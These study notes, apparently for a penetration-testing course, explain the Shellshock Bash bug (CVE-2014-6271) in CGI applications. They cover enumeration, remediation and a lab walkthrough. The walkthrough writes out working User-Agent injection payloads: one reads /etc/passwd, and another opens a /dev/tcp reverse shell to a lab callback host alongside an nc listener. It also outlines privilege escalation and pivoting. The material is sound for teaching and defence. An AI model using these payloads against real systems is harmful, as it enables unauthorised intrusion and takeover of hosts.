This module covers **Shellshock (CVE-2014-6271)**, a vulnerability in older versions of **GNU Bash** that can become remotely exploitable when Bash-backed CGI applications place attacker-controlled HTTP data into environment variables.

The important chain is:

```text
Web Server
    ↓
CGI Application
    ↓
HTTP-controlled environment variable
    ↓
Vulnerable Bash
    ↓
Function definition parsing
    ↓
Unexpected command execution
    ↓
www-data / web-server user
    ↓
Privilege Escalation / Pivot
```

The module emphasizes that CGI is old and relatively uncommon today, but it can still appear during assessments, particularly on **embedded/IoT devices**.

---

# 1. What Is CGI?

**CGI = Common Gateway Interface.**

CGI allows a web server to execute external applications/scripts to generate dynamic responses.

Typical CGI scripts can be written in:

- C
    
- C++
    
- Java
    
- Perl
    
- Other supported languages
    

CGI applications commonly live in:

```text
/CGI-bin
```

and execute in the **security context of the web server**.

A simplified flow:

```text
┌─────────┐
│ Browser │
└────┬────┘
     │ HTTP request
     ▼
┌──────────────┐
│ Web Server   │
└────┬─────────┘
     │
     ▼
┌──────────────┐
│ CGI          │
│ Application  │
└────┬─────────┘
     │
     ▼
┌──────────────┐
│ External     │
│ Program      │
└────┬─────────┘
     │ output
     ▼
┌──────────────┐
│ Web Server   │
└────┬─────────┘
     ▼
  Browser
```

The module describes CGI as middleware between web servers and external resources such as databases.

---

# 2. How CGI Works

Broadly:

### Step 1

A directory containing CGI scripts is created:

```text
CGI-bin
```

### Step 2

A client requests a script:

```text
https://acme.com/cgi-bin/newchiscript.pl
```

### Step 3

The web server executes the script and returns its output to the client.

---

# 3. CGI Advantages and Disadvantages

CGI was useful because it could:

- Dynamically interact with users
    
- Process submitted form data
    
- Reuse existing programs
    
- Support multiple programming languages
    

But it has significant disadvantages.

Every HTTP request can result in:

```text
HTTP Request
     ↓
New CGI process
     ↓
Processing
     ↓
Database connection
     ↓
Response
     ↓
Process ends
```

The module notes that this creates overhead because:

- A new process is started for each request
    
- Database connections may need to be reopened
    
- Data cannot easily be cached between page loads
    
- Memory and processing resources are consumed
    

---

# 4. What Is Shellshock?

This is the vulnerability we care about.

```text
CVE-2014-6271
```

Shellshock, also called the **"Bash bug"**, was discovered in **2014**.

It affected vulnerable versions of:

```text
GNU Bash
```

The module describes the vulnerability as existing in Bash up to approximately **version 4.3** and involving the way Bash handled environment variables containing function definitions.

---

# 5. The Core Shellshock Bug

This is the most important concept.

Normally, an environment variable containing a Bash function should represent the function itself.

For example, conceptually:

```bash
y='() { ... }'
```

The vulnerable Bash implementation could incorrectly execute commands appearing **after the function definition** when importing the function.

Conceptually:

```text
Environment Variable

() { function body; }; ATTACKER_COMMAND
                    │
                    └──────► Unexpected execution
```

That's the vulnerability.

---

# 6. The Classic Test

The module demonstrates:

```bash
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

If Bash is vulnerable, the function definition is imported and:

```text
echo vulnerable-shellshock
```

gets executed.

The module explains that the function itself does nothing and returns exit code `0`, but the command after the function definition executes when the vulnerable Bash imports it.

---

# 7. Vulnerable vs Patched Behavior

### Vulnerable

Conceptually:

```text
y='() { :;}; echo vulnerable-shellshock'
                  │
                  ▼
             Bash imports
                  │
                  ▼
          Executes extra command
```

Result:

```text
vulnerable-shellshock
```

### Patched

On a patched system:

```text
Function definition
      ↓
Imported safely
      ↓
Trailing command NOT executed
```

The module's test produces:

```text
not vulnerable
```

instead.

---

# 8. Why CGI Makes Shellshock Dangerous

Here's the important connection:

```text
HTTP Request
     │
     ▼
CGI Application
     │
     ▼
HTTP Headers / Input
     │
     ▼
Environment Variables
     │
     ▼
Bash
     │
     ▼
Shellshock
     │
     ▼
Command Execution
```

CGI commonly passes information from HTTP requests into environment variables.

If the CGI application invokes a vulnerable Bash interpreter, an attacker-controlled environment variable can become the entry point for Shellshock.

---

# 9. Security Context

A very important concept:

> **The command executes with the privileges of the web server process.**

The module explains that this is commonly something like:

```text
www-data
```

So Shellshock doesn't automatically mean root.

Typical result:

```text
Shellshock
    ↓
www-data
    ↓
Privilege escalation
```

But if the web server happens to run with elevated privileges:

```text
Shellshock
    ↓
Root web server
    ↓
Potential root access
```

### CPTS ⭐

**RCE does not automatically equal root.**

Always run:

```bash
id
```

and determine your actual security context.

---

# 10. Enumeration — Finding CGI

Now let's move into the hands-on methodology.

The first objective is:

> **Find CGI scripts.**

The module uses:

```text
Gobuster
```

Command:

```bash
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

Important options:

```text
-u   Target URL
-w   Wordlist
-x   File extensions
```

The wordlist is:

```text
/usr/share/wordlists/dirb/small.txt
```

---

# 11. CGI Script Discovery

Gobuster discovers:

```text
/access.cgi
```

with:

```text
Status: 200
Size: 0
```

Therefore:

```text
http://10.129.204.231/cgi-bin/access.cgi
```

is a valid CGI endpoint.

---

# 12. Don't Ignore an Empty Response

Next, the module uses:

```bash
curl -i http://10.129.204.231/cgi-bin/access.cgi
```

Response:

```text
HTTP/1.1 200 OK
Date: Thu, 23 Mar 2023 13:28:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 0
Content-Type: text/html
```

At first glance, this looks useless.

But:

```text
200 OK
+
CGI endpoint
+
Apache
+
Empty response
```

is still worth investigating.

### CPTS lesson ⭐

> **A CGI script returning no visible output does not mean it isn't vulnerable.**

---

# 13. Confirming Shellshock

The module tests Shellshock through the **User-Agent header**.

The example is:

```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```

The important part is the User-Agent value:

```text
() { :; }; ...
```

This is placed into an HTTP header that can become an environment variable available to the CGI process.

The module then demonstrates successful execution by returning `/etc/passwd`.

---

# 14. Why `/etc/passwd` Is Useful Here

The purpose of reading `/etc/passwd` in this lab is primarily **proof of command execution**.

The output includes:

```text
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
kim:x:1000:1000:,,,:/home/kim:/bin/bash
```

This confirms that the command executed on the target host rather than merely producing application-generated output.

---

# 15. What Does `/etc/passwd` Tell Us?

Even beyond proving RCE, it can provide useful host information.

For example:

```text
root
www-data
ftp
sshd
kim
```

You can learn:

- Existing usernames
    
- UID values
    
- GID values
    
- Home directories
    
- Login shells
    

For example:

```text
kim:x:1000:1000:,,,:/home/kim:/bin/bash
```

indicates:

```text
Username: kim
UID:      1000
GID:      1000
Home:     /home/kim
Shell:    /bin/bash
```

---

# 16. Reverse Shell

Once command execution has been confirmed, the module demonstrates obtaining a reverse shell.

The command used is:

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

The callback destination is:

```text
10.10.14.38:7777
```

The listener:

```bash
sudo nc -lvnp 7777
```

The resulting connection:

```text
connect to [10.10.14.38] from (UNKNOWN) [10.129.204.231] 52840
```

---

# 17. Shell Obtained as `www-data`

The shell initially has:

```text
www-data@htb:/usr/lib/cgi-bin$
```

Running:

```bash
id
```

returns:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

So:

```text
Shellshock RCE
      ↓
Apache CGI
      ↓
www-data
```

Again:

> **The vulnerability provides code execution, but privilege level depends on the web server's security context.**

---

# 18. Post-Exploitation Mindset

Once you have:

```text
www-data shell
```

the module recommends:

### 1. Hunt for sensitive data

```text
Configuration files
Credentials
Application data
Keys
Environment variables
```

### 2. Attempt privilege escalation

```text
www-data
   ↓
Local enumeration
   ↓
Misconfigurations
   ↓
Credentials
   ↓
SUID / sudo / services / etc.
   ↓
Higher privileges
```

### 3. Pivot

During a network penetration test:

```text
Compromised CGI host
       ↓
Internal network access
       ↓
Discover additional hosts
       ↓
Potential lateral movement
```

The module explicitly mentions both sensitive-data hunting and using the compromised host to pivot further into the internal network.

---

# 19. Full Attack Flow

This is the flow I'd memorize:

```text
                    ┌───────────────┐
                    │ Web Server    │
                    └───────┬───────┘
                            │
                            ▼
                    ┌───────────────┐
                    │ CGI Directory │
                    │ /cgi-bin/     │
                    └───────┬───────┘
                            │
                     Gobuster/ffuf
                            │
                            ▼
                    ┌───────────────┐
                    │ access.cgi    │
                    └───────┬───────┘
                            │
                            ▼
                    ┌───────────────┐
                    │ Test CGI      │
                    │ headers       │
                    └───────┬───────┘
                            │
                            ▼
                     Shellshock
                     CVE-2014-6271
                            │
                            ▼
                    Bash command exec
                            │
                            ▼
                       www-data
                            │
                  ┌─────────┴─────────┐
                  ▼                   ▼
             Data hunting       Privilege Esc.
                  │                   │
                  └─────────┬─────────┘
                            ▼
                         Pivot
```

---

# 20. Shellshock vs Tomcat CGI CVE-2019-0232

This is an **excellent distinction** to know because you just studied the previous Tomcat CGI module.

||**Shellshock**|**Tomcat CGI RCE**|
|---|---|---|
|CVE|`CVE-2014-6271`|`CVE-2019-0232`|
|Target|Bash/CGI|Apache Tomcat CGI|
|Typical OS|Linux/Unix|Windows|
|Main issue|Bash environment-variable parsing|CGI command-line argument handling|
|Key input|HTTP header/environment variable|Query string|
|Key condition|Vulnerable Bash|`enableCmdLineArguments`|
|Example separator|Shellshock function syntax|Windows `&`|
|Typical result|`www-data`|Windows command execution|

So when you see:

```text
Linux + CGI + Bash
```

think:

```text
CVE-2014-6271
```

When you see:

```text
Windows + Tomcat CGI + vulnerable version
```

think:

```text
CVE-2019-0232
```

---

# 21. Mitigation

The quickest remediation is:

> **Update Bash.**

The module notes that this can be more difficult on end-of-life Ubuntu/Debian systems because the package manager itself may need to be upgraded first.

For systems where upgrading isn't immediately possible, particularly IoT devices:

```text
Vulnerable CGI device
        ↓
Remove Internet exposure
        ↓
Restrict network access
        ↓
Evaluate decommissioning
        ↓
Upgrade / replace
```

Firewalling the host internally can serve as a temporary risk-reduction measure, but the module describes this as a **temporary workaround**, not a true fix.

---

# 22. Why IoT Is Important

This is a great real-world CPTS point.

Shellshock is old.

But old does **not** mean nonexistent.

The module specifically says testers can still encounter CGI applications during assessments, particularly on:

```text
Embedded devices
IoT devices
```

Why?

Because embedded devices can contain:

```text
Old Linux
   +
Old Bash
   +
CGI web interface
   =
Potential Shellshock
```

---

# 23. Enumeration Checklist

## Web Enumeration

-  Identify web server
    
-  Check common CGI locations
    
-  `/cgi-bin/`
    
-  `/CGI-bin/`
    
-  Look for `.cgi` files
    

## Fuzzing

Example:

```bash
gobuster dir -u http://TARGET/cgi-bin/ \
-w /usr/share/wordlists/dirb/small.txt \
-x cgi
```

Look for:

```text
*.cgi
```

---

## CGI Validation

If you find:

```text
/cgi-bin/access.cgi
```

check it manually:

```bash
curl -i http://TARGET/cgi-bin/access.cgi
```

Don't discard it just because:

```text
Content-Length: 0
```

---

## Shellshock

Think:

```text
CGI
 +
Bash
 +
HTTP-controlled environment variable
       ↓
CVE-2014-6271
```

---

## Post-RCE

Once execution is confirmed:

```text
id
whoami
hostname
uname
```

Then investigate:

```text
Users
Processes
Configuration
Credentials
Network
Privileges
```

The supplied lab specifically demonstrates:

```bash
cat /etc/passwd
```

and obtaining a reverse shell.

---

# 24. CPTS Exam Points ⭐⭐⭐

### ⭐ 1. Shellshock

```text
CVE-2014-6271
```

---

### ⭐ 2. Vulnerable component

```text
GNU Bash
```

---

### ⭐ 3. Attack vector

```text
CGI
```

---

### ⭐ 4. Core bug

Bash incorrectly executes commands appearing after an imported function definition in an environment variable.

---

### ⭐ 5. Common CGI directory

```text
/cgi-bin/
```

---

### ⭐ 6. Enumeration tool

```text
Gobuster
```

Example:

```bash
gobuster dir -u http://TARGET/cgi-bin/ \
-w /usr/share/wordlists/dirb/small.txt \
-x cgi
```

---

### ⭐ 7. HTTP header

The module demonstrates Shellshock through:

```text
User-Agent
```

This is important because HTTP headers can become CGI environment variables.

---

### ⭐ 8. Typical privilege

```text
www-data
```

but **not necessarily**.

Always verify.

---

### ⭐ 9. Impact

```text
Command Execution
      ↓
RCE
      ↓
Initial Foothold
```

Potentially followed by:

```text
Privilege Escalation
      ↓
Lateral Movement / Pivoting
```

---

# 🔥 Final Shellshock Cheat Sheet

```text
SHELLSHOCK
──────────
CVE-2014-6271

COMPONENT
─────────
GNU Bash

VECTOR
──────
CGI

COMMON LOCATION
───────────────
/cgi-bin/

DISCOVERY
─────────
Gobuster / ffuf

EXAMPLE
───────
/cgi-bin/access.cgi

TEST
─────
HTTP header → environment variable → Bash

CLASSIC CONCEPT
───────────────
() { :; }; COMMAND

IMPACT
──────
Command execution
RCE

COMMON USER
───────────
www-data

VERIFY
──────
id

POST-EXPLOIT
────────────
Sensitive data
Privilege escalation
Pivoting

FIX
───
Update Bash
Restrict CGI exposure
Remove Internet exposure
Replace/decommission unsupported devices
```

## 🧠 The one mental model to keep

```text
        CGI discovered
              │
              ▼
       Find CGI scripts
              │
              ▼
       Determine backend
              │
              ▼
       CGI + vulnerable Bash
              │
              ▼
       HTTP header becomes
       environment variable
              │
              ▼
         Shellshock
       CVE-2014-6271
              │
              ▼
       Command execution
              │
              ▼
          www-data
              │
        ┌─────┴─────┐
        ▼           ▼
     Secrets      Privesc
        │           │
        └─────┬─────┘
              ▼
            Pivot
```

**CPTS takeaway:** Shellshock is a great example of why you should **enumerate the entire request-processing chain**, not just the visible web application. A seemingly empty CGI endpoint can still be the bridge between attacker-controlled HTTP input and an underlying vulnerable interpreter.